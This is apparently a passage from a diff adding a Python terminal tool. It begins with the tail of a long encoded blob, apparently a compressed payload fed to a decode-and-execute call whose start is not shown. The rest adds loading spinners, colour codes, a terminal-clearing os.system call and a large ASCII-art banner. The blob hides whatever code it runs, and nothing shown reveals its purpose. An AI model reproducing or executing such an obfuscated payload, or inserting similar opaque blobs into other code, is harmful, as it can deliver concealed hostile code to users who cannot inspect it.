YycKhfXhXA7gT4ErwklVotA/I4hQLQ19Lus4hpup8NPlUO2rsDL4saADIFNk+I69hbpjvM9AjGLQ9sP3djrVqwC8TfLIlcsXEq/+uxqKcjSMKwPlJDfcQ2oPrZ4CkRn6RAjtqqAtjwxFTNBs7De/bVZt3bm3lk0qzKuBrU8CGiJuDZWxXJjFMXy2mj7lYOMIHp6byrYEdwpBJs+EQAQ8Crj8sf/8FxKCnE/lnDq7di7SOtU2OlWROuZ4A7H534Pd+5or0JVY2KEGI5hbUOlR4748cwiVDNw9Hua/sjZXUoFLJgntagRbrHZCtQ5lyjVKKHOd09+3b1ufh3ZLmEUt1X3du1PK/jr3v+lGrGea8fSQleHIex1SFr22mbsRuTfwgIkA+jSr6R/+diglEewu5yQVqkcEwKArVHkZWXM36g+1hYUQZJSFocj9z8aON0NaSCy2N4Xv5Q3WlWPCrD9LJjFlOjAN51uCPPB7eCuawfSQiAGIXvKKF9s4VIN4kkeYnp0IOvvGjkLpRL23coa/5ouxhsdrud2iHkEBqCBKAP76db+94467vHoHVBqF8XollvmQUXXDTJ7fxqMKi8NeOOZ0GJYlmxUc0c+PExsC7gldKYkLPByIxvNnRIK/0t5f2zv9Xg8oX3K40M0rfod8VTS3y4GanoXNTcQL5JPFdsl3P4Ft/SwziO92vubbAZV47ntISF5TZ10G97FV+ngNGlsdlsHAMLgxWdklZKO9YsT7tdcLNpRsGHy5LsL8/ygwP7rwkeQ3MKxMiMftub6fn38GSvMoyRAoYVC95Vw5orh+kXC+F4AUc0Yuqhh0HKAFGqUxaCOyVYr3VlpgB7cvfQd0f2i6w288ggUC6tvLjspj/TpR2VC5PsuL4NQiv4CcoKFtl6Nwwugpx2w3sKLk9dEWJQtHGXjqey/0E7tls7ZBT6rHE8n/13v/nMZlzTOT4sQQgd23wKo1SpBHNCl5V0c21/pFYYtkDpPGa9SJaQfPS9SWNqkYas7D/PUbWsGGHIwEdoYDPrxgN/OO7RxrHbiy/YO/nwMwvjtGV42688b72SN55UXezRnqkoApC9muYwdnjn0bfKegt92WlLuCYY82O9Vr4U392VuFN3zyX8dpurU41mvHk7bKxP24wIWstee6xwx92RxeF5qvU7pz1OS8zZDacG+f/8/VkI7L2MugUbGx+a8UishfiM7/w1ArNSPt8ZCrCUXDrX7cAY7W++URm6eMlGaEYQdyHiLGy/+BBczOLY75cFFOqWWPooJDwm4XH2mkQQ+M8VEoxeY3ZHxemxD3VjVX9A7x03g4n7Ec1vHD5tS0+H+TgKevlmEZBvHiEB0y0BtlBvbaTx4YY4bpAlA9npPmSH2F3q5fY2r45w7VZDrzvf6nLDtBqWPgqr3Qmg5HUSHSKTr+Aq8FwHubJ+/GIdVnQG8/tyj6b/EOVhLXijYSGbWpgtEVk3+fLH7aXJG30gXcvEgnXVYzyDN1cAIONwOnDmWdk4cnceUUfq6NEpNT0KLzO/XPgbTipAFGD7YTiJdxZ2eEiSr8pkgZNWdXQcJD5vWd4q8nYTs1hq3DTz2ZWuR+V0WTkwcshoDPz6Y2N7SIbXNnJljUgiYlhAz7ThK5fJIjzwJqH28lOEMdvYEwlLrOYYfJ+e5PKSW4TPfS/EGP+NZJdh/sn+D8Jz75vDlNWefQ7Nyvu/gSL1jmAPO5hzAlDDPQBAClFNcQN9Y+vnhQlPWTpptLG+SHOSqv2h8i67udcm76got/T+M+uIkLiDfvWsup4cwCyH7ZMK4u14srkbigEIVRu4HDxCmdRzFIWBnH73bXMdDhZtXCE2MN2EXrTIuleA0WMMAj4BeQ1YXuIuLP/Amm8uhhrdPU5Y+hW1TB6CuJzllvwjxidN33JsMykDYgNoYjk4Sq03o+59BV1v4Dl54lMevX7bjP1htl5SVFy0nCaZU7D8Dy8pW0EEauPVdqE4PQEj8G0tlq0L12aPn68SmKx9wktZ03nIM0ix1NxRZNDvFJjahTuaSLs5H2CcCzx/oKdfUs4ipBoeolt+Lsqnm9uud8HBhZr9nsGZXpK33Vg1QIvsQ/RqFrE1fsnVmbqA0hyTO3w4oE5DBxqKWoKiUndovgEw7g6ES1wAKm7XINLnKmesOHMZ+jwnw48rcQLiGzDyl4fEpiLF9fifgX3sVrVwokrtbnaJtRh9mLOWemb/QcCRR7Svez8QdYXDsYBLcpOshrJJVYAD6ktgcs74vTwqlTduYrAeCAsEgj30URrCDsujBJtqfolVAOxJxFHvQ9HxB0XtSz1B7wYJjqgWG/QbdGs6SkqpsQvd3thcDFE40Lk3jOIfDYUXzhGdHnPq9oWqZ8QcAEnOD2FfD7oXNKi9yC/ecfj5i44+91321jzIuYe1egxVoxcqg1N+EoKdtbQi6x1V1YgmVRRUMIJFD+0OIqzBvJdxXZmpF47yAs0ZGWbrwgeVNYIIIsnQR/CWGhRC156rdUAZ9zw2dvd/kVFdeqpkUzt3AXYK5mB/FBWRG5GTWzVAo9F28JO3haxCO0uX/l+seEkbub+WGHaYlImri2sL5Wm2OVkWxuHkLmdNiL8T/W8Br3Jltexpsz23RVk2qj/RhlcSVFpWi1XIzrVev4+UEfrD6F81lnpVc/PQ6bqt7+ygLlf3L1DmKc4i2KgDiPQn0EvLBEO/I1luFqZTeL9ZuiB80kM3I4xi4ZmKQeDyirEHeg8GTEjteUbdegoV/FzsYO6XB0T4HhHXn5MsNcoGjDizf0VLtA94V7LxUuw09xiuQOrA6OEsBpLiwRAk197t7bTZWICyp6sKnTEKGfsnP/t44XxurdMonZbTLAHvYqJLgYrRLcyeDuvQqeL9iL+a++nVO+q+3gItL37vi+GFwVivm6EKnqv1EXhv/HeZBzDvfQyceeQcdC2Wn0V9GXeoeiUx2CM8s74kpvVuQ9nY1C76S4ZnXCvo51U6t+c0d/ONeda8G1czicAlm7g+dB6H1JWUs4zpxXk95/b0c9a4HfEyzuO+ovadsyF3r9zE9zNC8Un4j8I/SQ16kE9vSjqBWnSEcDV+2LHNeVJZPczVDpxMHFAVlQS5gyVz4dT2o/Bk16gZEvadbIaqCIy31qLcGf1KczSNWtTnKavnjFGnr0rPnrDiTQPn4xLtZRhO/iKC+JG4ZBsJ44iuk2zh6QNbkPQLt6jmS2TQskbrkwglSZq/2NpPp4YvHmxgEtCf1IXkMY0Vv9p/DS9ewEWaxD0btIt2J3tloDnYbUpuZup8zClgepQ4jVegcg/3q3bmw/bxXCvEZuuc8P+/oZuQuEYxpQ1H3kp/kaYE1kl9zVPquwPzI586n0YgJGL7WELF8WVS/QWVr3xL5F6xK27QEZ3hMFsJNfrapU0AcveirBFExrc59Paz9ul8pLjhHaUMm3uPtlp+Zgu/+Qt63Qc1WgXGwd59Q+PgbpN9/WvMw33Kk8sQnlO3oVJ72bI/a0Ekzc5d0whRHL7Lajua0sWjnoQAvCQaegO7xrvLiiMPzvh6RYPbd/t2kBGR0k2cMvYtnIuMtv7zzlPTPu+JLR0QeAQ6VhDbj6upnO2XO39L+SwCOrDSNz+T7vJfzfz1JoLAHZg8ecU1dAKltxbEskoAL83YF56f+FZhxLf6H6c3/msEx+igC0WtKXzYkcz7FAnitkNPvw74zM4tWDA4FroGcqLFd3ERHS3zd4D+ck1+60MGcrsKXpAHNSXQOSojYgowYdiiVh2aIza61rlvoOCaURAxdql/iEZyQ5gmm4/p7uozUd3v7k3gusJxV/oGsw6xN/Q6dPjHo/1XJ/GiyV3Tp2qFVjzMBtTZykhN2vTUEGuYX+mgRt7vw9DFrnI4ZELFKB7y7CfL0pF4Ju1gq8bjF84LEtM8e7/ZWjFkeT7rWZdQMre5ArAfgLBgoXU48/DM7o3DQyc8kd4rvK8jtqX4nHFxgjFqwzz/+9zU6WOsZdeS72yd2jwSa9rHDRvEhSglI8JUZ3uCmEfnClMHC1yt/dW/eNrydwXAB71gwovYGM2pyXwNX79y7jr77YeneJTZ84foPVLCO9N1vuwQ5fCpkIlvptDZ7raBggmGLv1nvHKNq5sJS/n2IWfIvzPe7U48zTdeqCaFhcJ5rCmfFaxcHZE3wft/z2/YooNJ4o6sQ5/LXerNvYlM/0Ymu5ZQgH4pq7GoNCrozalknguwFa7wpIaPvvMewllcPMD5xPMWQAwei4So690qkuCci+3KxTPebm2G7V0hOBs0YJYx+iZBrID+rrJI4ni+aoQ6jsMufGrBADjb36L547M8qnOF0syBAzCqhbYW5q69WnBEBo0k3MMRVuADdjghG4rBpFwG1eRFI7PwH4vAgjrkMx+dJ6xzkIrOxFdE2MJvDyPILGiH4GfMpoQ8DWEryT736H+1ZjNu3yrUZ2adibPNEbEycWmPrR4mEL3OZsssaE4xzDJHfU/vL8REmRD17xy4qpIA9J1swRMqpT06PvZkTaa4MVvEhiIwkLE4lGSZA0qyjNF+uD+0aUrUM4bAU7yf5yIB7J3jtfX34bVIDarIW+e86vlN2xhXi9gS6Xf7sug8gN6lJwpxABTFAeAsxv2otAJw8tHFEXKBzMfrgcTl2TKZaBjBJTsZKVoO8STN6jWPP01JX9BNsnKbxH8Mxz5Sx/QSOT7uRb1vQh1TNXSFPLaHIzK2fhdlVYeVDl69REidMiPaYShosIjGJTaAoPNJ/N5omBlycv1Yt4N7RKGWu9VxnV2c1STP6IME9ScN6hXN8HegMXbZyBnX1qeHqV/2UeUvHleBMOM+zXNfnsqtNNHzh7brmtsVaPungmmzR6VyL3MKaC6eAGgky5VmbZJFOddknxuut5o15smIELSFXbDyNN5ARr6tAt5J9aj9rcl02EJVBfQaZoDfQHFfxchpwsD1JF2WpsvSR0lSH+bLKMT6yLySd8hM53Ti/C+Tkwv/mMcg6Pv8ZxzJoLQAYq+ECLPjjuiJgZAtL+a48C8I2hNbgfQcQ60rPQ4xR433QWIVco/uAWKsiqQIH31G2B6A0iNb2q6o522KsdIE/aaArssysxWy9Iir6LThnKc96f4JN1A96WfilWYRrT8C7b77PEZAskzPegPRkGAwXXvF36EFAwpqmZT+0Y3x0VT1t1AAJNR4Vw6npppMMdmhaE9VNDnYSvbicAQuVM1bUPQwWsgmHF6XmvY8Tv0p0U57ZrpQRTO07vIdv1MiwV2vJsC7EtJPuFyUHVLWqOkbt6wQtzZT1D2a3TE0hCK4+USExqwly6VdFUpGEOKLqIdUvr9m1js2fZIF+EONHUT5Lr3MaTcGPT7chu/aVc2Nrlvuf7BtsI+ISpb7P1nhhb3HmpwKTjqANFNtqB6e4NeFs++n/kEFtK8o1uR19gPhKSvThYCb5DizGwabHL7cgKErzblJrfFp8+VBLQdcOmzVKvhfVmdzjCd/n/MVNPYVDremdn4ILH2wddd70gICxjhL1h5KPInaA9R/BFIBGWElE66oa15rcH/dxUGXkp4w0ycyjHKEibzrRmXVUwBzR7CWfrzq4SYY3EpWMER2tHomKOxA39ZmCdx9Uj+S/9Vs7OIuhNDGKxeqKjxGquJMmayGzBBp6mkyPKu+NQCwsabIv06c3SqBBu+5fX6M2PTtb8B6IbabpHXFYvsC9yGPGbtiztjzi4kxC7OAQl2jEjw36nrBrMsNoyW8fLMjGEtZDKrfCU4v30UoKKiY4Ye+5B5RwyvwepXCyI/CzMoxfyE82V8+DlL3jGWhv1ErF1/taTiLyGOCM7mKXc9T6hwvCikJqrEZppleaDivgod67D2CJebiibMF9uv054hDlADd+nVMOD1J+F5RxirBKBRzSyE6LtQhLUwr0FPcRvdOMnCJAtDZ9WP/dceKaa9ADIDOw1ZxounSxVAS0lQTVBl3P2WdLwR13WHYI3hY4RUXzmIoPEUPac56m2HFp+I4TtIn9E8vFKq2Xwm1HO5sCOBfd7qXdUBKE58LZr2VfpI5bOKObTyCpfqNk60r5PZur3+FUmryE7w/2LXoSwfJC0CyTgGWaeuY55f/Q0TEC5vnvU2nI+hD+5Iw6U+oqPJHYeTQ3pQtjsArU/moykY9wP+Jg0WAm+r6Ms+p3R8AE241yoIo2aMu2lUq7wl4xTgU7PlFDcWrmLspx4k2nSMt3PJzkN4xbem8AhQUqzTC/FoX+XNa92ekPNhbmqC5n+XkN1pnK2pe+eMox7xtU7qm3envN1L7a3HNUtjaZ1vk/I6YOwUsZuZCv8eBRJIh6a1SslXCkjS8rMraVhBkXGmNBzeDRNdTvFmkkQUOy5WO1ghfKHNxaXjojB3mG0t/t+BlE5BxdRqZQc3clx7OadTx3FK0GRw3/g05LlnkB05zuM03EYtSLzXU8xc0EpyePldvL/vEOz8lF3PkrzdJ9j4W1/XA01iMsXRVILwvHdVOGjqMrDEavB6+BRdZPOWPzMT3SMD/0Lz3fQr+w88O2CGd3MhPbD7deCmrJHD+qTJtEphffmf9xov8Q+Dw9VKA31NOgRzOMQvuq23KgGNUH3MwJiPQvRafQtWQ5+ucRDBDDRg9PoZWVmDbBa8iXN6fvPOMwpcqT3Aeph7NQeE/LougtAUboKfVRhzsSBNY1jFpUUyWETgalfXrTiHbAsw0WWHWJ+HhmUZdF7P2YuKS+JlnEdQbJv/VlBXgk2CIvzmRM1X2B0TDY6kPmGPGYdr5qG0m9yUG1hfuu0uzQJYDqQ37DjpFwfJ1PKT3quTWQjEGjSuZOYFhO7UYg1H15eXq8UlCtcZ4GYqp6jjngCCf2ACdyURWcOFYfRODizkirizRa+FjZpM3jOI5KggGJP/tZtqJTyW22YoxVVg7VKqAsD7ZvE7rMVzaraE+YoJ9OoYQDa1+OVuaeapYV1Ec2H6bF8QZ0nZO74VQL5wEgcKaAefWywUXBznmyRlQpAmLvhsWtDRjEdmLL7APweWksw7rspz0y3l5GCueZuFvipzyl3XZywDaxkBuYug6acM1z2+zao3bgpnkkj6zdEvfKHJa0gkZnGCl6VK622R4OZCrRGlI8h6Fshtohyi4U/r2sVv7MW+PiMj5LayGDZafdIK3AoQnPoC5J6n8EI2+gFUruDhSfUbtLEJU0ZoyGe92FqVt6uVtGw4ceGpg8QxgNSkzxVVU/wZigSU3a00RROjJ+PQEM+fktmt0rTjqF40zNufc1F+MYEEmeadxyloQZHXthGtlCK3SJxG6h8NglYQyy69hUNxHmtfDR0yMYW2hBqppXWi/u3bnzOJNQcu9Vqe/HCf7x0Q2M9YqSTUQeSezgNNTVv1lPnRvSW/T7NeNUew7Lc3yGTOlt259bGsAAHiZk90O6Z8OlNvozhgchHqSJJ+mkwV6wjUj5L4JnjFaXvig8MkI3fvowYQtLqWcFmtNtLsmJoaZXegOtX0D5BnVC6VFYp4kIxHEHAf2o08Jed8w2KaltQ0nA1HyR+K6uUHK9JpRnKCxGrLrvlCm3tJ6dxjNO4icDRGlJt9QDADd+sTDBiprJbrA1IenKnBAhp/MmMN+fnzGtgjhWQs2BGpTfQ0kv7grRBseskmis8vMsErW6kvWtl61xdrpwUjUQmc/Q4R/lDZvziri5+gMpwWQ/+27oMjuty7jOF1EM7MsdUxG0wQRy9VdP4ZxwbIfBWE/ZIuZJ6YA52lYmahFmY7a9ICIFazvA2hWri1hPtMMUzSvTgu2LZFOvs2fB5oS+gEpJzzgT5pixLC4AEjgVG11zj/TuvtJjkdYkL3yDH9zhayT4HgDlss8Q27glD/Hp1lb9AwdQpeh99QkjUHDmCAUEF6gEyOulbpS90FV76UwEP1ZF6zG88xOEI1SB8fPYlFSgvnbTXNT0q0+RHktAwRK26nYWwt4/Fv8aIEpdb3A2qPl+S1/zVVp66jyDHIjJUKcwOe88G+aT9IPv33XZAdYncsH08ZWMDRSeUr9pVPxAii8qewSa43TpuyTBjEi6GYOVLfsfGs9vWlZwTiO9KQjK+SJSis9et+6XQJ5FQmN6T/yNmpAyz7AxGvLyJ2Sebsct3hc7pR9FvpMiomVxuJ3X+Q7F6cPBWegLuYEc3IAcJJ9SfmWDhyOTLTZzoIZvf+QE+K34Nbey6ZNciD9apUtoGYDtN9WrjzZiXMkSrKRgoGIHKNdCIwfr4pt38bHYFxVu35rq1ScUYnUi6yfdY2Jl4UOogSsnjtMHRWYX6OSHtmhMampTjsxhoZtbFwi10TXGpYsSXGE0AtKXSeh313RN3acEOWyJaRddXXhXYvjrGNBGw1i35RZ//j/P1///m///Iuq6tbZvuHOcJFA79+XHhJtiVhOzODEZrBmGGaWTdYRWC16yWkmUwJe'))
+import os
+import time
+import sys
+
+def loading_animation():
+    symbols = ("⢿", "⣻", "⣽", "⣾", "⣷", "⣯", "⣟", "⡿")
+    for _ in range(3):
+        for symbol in symbols:
+            time.sleep(0.1)
+            print(f"{green} ~>> Loading {symbol}", end='\r')
+def loading_animation2():
+    symbols = ("〡", "〢", "〣")
+    for _ in range(3):
+        for symbol in symbols:
+            time.sleep(0.1)
+            print(f"{yellow} ~>> Loading {symbol}", end='\r')
+
+
+
+def clear_terminal():
+    try:
+        os.system('printf "\033c"')
+    except Exception as e:
+        print(f"An error occurred: {e}")
+
+#clear_terminal
+clear_terminal()
+
+
+
+
+
+
+green  ="\x1b[1;92m"
+cyan   ="\x1b[1;96m"
+yellow ="\x1b[1;93m"
+magenta   ="\x1b[1;95m"
+white  ="\x1b[1;97m"
+blue   ="\x1b[1;94m"
+red  ='\x1b[1;91m'
+underline = '\033[4m'
+pink = '\033[35m'
+bold = '\033[1m'
+black='\033[30m'
+
+clear_terminal()
+
+      
+while True:
+    import time
+    def type_text(textss):
+        for char in textss:
+            sys.stdout.write(char)
+            sys.stdout.flush()
+            time.sleep(0.0001)  # تنظیم کنید که سرعت تایپ را تغییر دهد
+        print()
+    textss = (f"""{white+bold}
+             ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+             ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⢻⡟⠩⣿⣿⣿⣿⣿⡟⠀⢼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+             ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠡⣤⣀⠀⠻⣿⣿⣿⡟⢀⠀⡇⡆⠘⣿⣿⣿⣿⠀⣴⠘⣿⣿⣿⣿⡟⣻⣿⢻⣿⣿⣿⠟⡟⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+             ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⠈⣿⣿⣿⣿⣷⡀⢿⣿⣷⢀⣿⣿⣿⡿⢸⣧⢸⣗⡀⢿⣿⣿⡏⣴⣶⣦⢻⣿⣿⡟⢀⣿⠃⣼⣿⣿⠏⢰⣷⡄⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+             ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⣌⠛⢿⣿⣿⣷⢸⣿⢇⣼⣿⣿⣿⣧⣿⣿⣿⣿⡇⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⡇⣴⣶⢰⣿⣿⡿⣠⣿⣿⠅⢀⣿⣿⣿⣿⣭⢉⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+             ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠻⢿⣿⣿⣿⣿⡄⣫⣴⣮⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣽⣿⣿⣿⣿⣿⣿⣿⣛⣩⣴⣿⣿⣿⣿⠟⢁⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+             ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠉⢣⠐⡀⠙⢿⣿⣿⣷⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣠⣿⣿⣿⣿⣿⣿⣏⡙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+             ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⡀⣦⡀⣿⣶⡈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⣭⣬⣿⣿⣿⣿⣿⣿⠋⢀⣴⣶⣮⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+             ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠻⡿⣿⣿⣿⣿⣷⣸⣿⣾⣿⣿⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⣡⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+             ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠻⢄⢠⡈⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+             ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⢤⣁⢻⣷⣦⡹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠠⣶⣄⡙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+             ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣌⢿⣿⣿⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢈⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢋⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⡐⢿⣿⣾⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+             ⣿⣿⣿⣿⣿⣿⣿⣯⠈⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢼⠎⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⢼⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣿⣿⣿⡿⠿⠛⠻⣿⣿⣿⣿⣿⣿⣿
+             ⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⠣⡄⢀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣼⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢣⣿⡇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⣃⠀⠿⠇⢸⣿⣿⣿⣿⣿⣿
+             ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣦⠐⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⡿⣧⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢃⣾⢿⢲⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⡟⢁⣼⣷⣾⣿⣿⣿⣿⣿⣿⣿
+             ⣿⣿⣿⣿⣿⣿⠿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣗⢿⣶⣷⣮⠻⣿⣿⣿⡿⠟⠛⠉⠉⠀⠀⠀⠀⠀⠉⠉⠛⠿⢿⣿⣿⡿⢫⣴⣵⣷⡕⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+             ⣿⣿⣿⣿⣿⣿⢷⣦⡌⣙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣮⢻⡽⣿⣿⢤⠉⠁⠀⠀⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⠀⠀⠀⠈⠫⢾⣿⣿⢯⢋⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⠋⠉⠙⠛⣿⣿⣿⣿
+             ⣿⣿⣿⣿⣿⣿⣦⡈⠉⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⢾⣽⣿⠗⠁⠀⠀⠀⠀⠀⠀⠀⣰⣿⣄⠀⠀⠀⠀⠀⠀⠀⠐⢿⣿⣯⡇⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠀⠒⠛⠻⣿⣿⣿
+             ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣾⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠊⠂⠁⠀⠀⠀⠀⢀⣀⣤⣴⣿⣿⣿⣿⣷⣦⣤⣠⠀⠀⠀⠀⠀⠀⠈⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⢁⣤⣿⣿⣿⣿
+             ⣿⣿⣿⢋⠉⠉⢉⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⢀⣾⣿⡿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣧⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣭⣴⣶⣾⣿⣿⣿⣿⣿⣿
